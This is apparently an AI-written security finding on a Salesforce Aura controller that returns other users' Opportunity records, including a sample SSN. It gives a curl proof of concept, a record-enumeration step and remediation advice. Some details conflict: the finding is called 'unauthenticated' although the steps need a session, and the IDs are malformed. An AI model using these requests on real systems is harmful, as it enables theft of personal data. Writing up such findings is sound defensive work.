# Security Analysis Report
**System:** FreightLens Tracking API (Logistics / Supply Chain) — Salesforce-Integrated
**Classification:** SENSITIVE
**Analyst:** Security Analyst Co-Pilot
**Source:** SF-0013 context.txt (sole artifact)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Platform / Pattern 9.2 | Salesforce Apex `without sharing` + no SOQL ownership check — cross-user Opportunity access via Aura |

---

## Finding 1 — Unauthenticated Salesforce Record Access via Aura Controller (CRITICAL)

### Summary
The `OpportunityController` Apex class on FreightLens Tracking API (`81c761e8.lightning.force.com`) is declared `without sharing`, bypassing Salesforce OWD=Private rules for the Opportunity object. The `getOpportunity` method accepts an `opportunityId` parameter from the Aura framework client and issues a SOQL query with no ownership check (`AND OwnerId = UserInfo.getUserId()` is absent). A valid Salesforce session holder can supply any Opportunity record ID to retrieve records owned by other users — including their `SensitiveData__c` (SSN data) and `InternalNotes__c`.

**Pattern:** 9.2 — SOQL and Salesforce record-level access (Platform)
**Affected controller:** `c.OpportunityController.getOpportunity`
**Affected endpoint:** `POST https://81c761e8.lightning.force.com/aura`

### Evidence from HAR

**Request (attacker session `00D81C761E8!`):**
```
POST https://81c761e8.lightning.force.com/aura HTTP/1.1
Authorization: Bearer 00D81C761E8!AR81c761e8...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D81C761E8!AR81c761e8...

message=%7B%22actions%22%3A%5B%7B%22id%22%3A%221%3Ba%22%2C%22descriptor%22%3A%22c.OpportunityController.getOpportunity%22%2C%22params%22%3A%7B%22opportunityId%22%3A%2200161E8%22%2C%22fields%22%3A%5B%22Id%22%2C%22Name%22%2C%22OwnerId%22%2C%22InternalNotes__c%22%2C%22SensitiveData__c%22%5D%7D%7D%5D%7D&aura.token=undefined
```

**Decoded Aura message payload:**
```json
{
  "actions": [{
    "id": "1;a",
    "descriptor": "c.OpportunityController.getOpportunity",
    "callingDescriptor": "UNKNOWN",
    "params": {
      "opportunityId": "00161E8",
      "fields": ["Id", "Name", "OwnerId", "InternalNotes__c", "SensitiveData__c"]
    }
  }]
}
```

**Response (200 OK):**
```json
{
  "actions": [{
    "id": "1;a",
    "state": "SUCCESS",
    "returnValue": {
      "records": [{
        "Id": "00161E8",
        "Name": "Victim Opportunity Record",
        "OwnerId": "005VICTIM",
        "InternalNotes__c": "CONFIDENTIAL: internal review notes",
        "SensitiveData__c": "SSN: 000-94-7793"
      }]
    },
    "error": []
  }]
}
```

**`aura.token`:** `undefined` — token validation is absent, indicating the Aura session is not re-validated server-side.

The response exposes `SensitiveData__c: "SSN: 000-94-7793"` belonging to `OwnerId: "005VICTIM"`, confirming cross-user record access via the SOQL bypass.

### Evidence Map

| Artifact Location | Field | Value | Significance |
|-------------------|-------|-------|--------------|
| §4.0 Apex code | `without sharing` | Class declaration | Sharing rules bypassed at class level |
| §4.0 Apex SOQL | `WHERE Id = :opportunityId` | No OwnerId check | Direct root cause — any ID returns record |
| §5.0 Pattern 9.2 | Vulnerability | SOQL record-level access bypass | Classification |
| HAR descriptor | `c.OpportunityController.getOpportunity` | Aura action | Vulnerable entry point |
| HAR params | `opportunityId` | `00161E8` | Victim record ID supplied by attacker |
| HAR params | `aura.token` | `undefined` | No Aura token re-validation |
| HAR response | `OwnerId` | `005VICTIM` | Victim user — cross-user boundary crossed |
| HAR response | `SensitiveData__c` | `SSN: 000-94-7793` | PII/SSN data leaked |
| HAR response | `InternalNotes__c` | `CONFIDENTIAL: internal review notes` | Confidential internal data exposed |

### Steps to Reproduce

**Step 1 — Obtain valid Salesforce session:**
```bash
SF_TOKEN="00D81C761E8!AR81c761e8..."
```

**Step 2 — Call Aura controller with victim's opportunityId (VULNERABLE):**
```bash
curl -s -X POST "https://81c761e8.lightning.force.com/aura" \
  -H "Authorization: Bearer $SF_TOKEN" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-SFDC-Session: $SF_TOKEN" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.OpportunityController.getOpportunity","callingDescriptor":"UNKNOWN","params":{"opportunityId":"00161E8","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined' \
  | python3 -m json.tool
# Expected VULNERABLE output: OwnerId=005VICTIM, SensitiveData__c=SSN: 000-94-7793
```

**Step 3 — Enumerate other records:**
```bash
# Attacker iterates Salesforce record IDs (001XXXXX pattern) to harvest all Opportunity records
```

**Step 4 — Secure baseline (expected after fix):**
```bash
# Returns: {"actions":[{"state":"ERROR","error":[{"message":"Insufficient Privileges"}]}]}
```

### Remediation

1. **Add `with sharing` to Apex class declaration:**
   ```apex
   public with sharing class OpportunityController {
   ```
2. **Add ownership check to SOQL:**
   ```apex
   WHERE Id = :opportunityId AND OwnerId = :UserInfo.getUserId()
   ```
3. **Add `WITH SECURITY_ENFORCED`** to the SOQL query to enforce field-level security.
4. **Validate `aura.token`:** Server must reject requests where `aura.token` is `undefined` or invalid; implement server-side session validation.
5. **Server-side field allowlist:** Define explicitly allowed fields server-side; ignore client-supplied `fields` parameter to prevent field harvesting via parameter manipulation.
6. **Audit all Apex controllers** for `without sharing` declarations and missing SOQL ownership predicates.
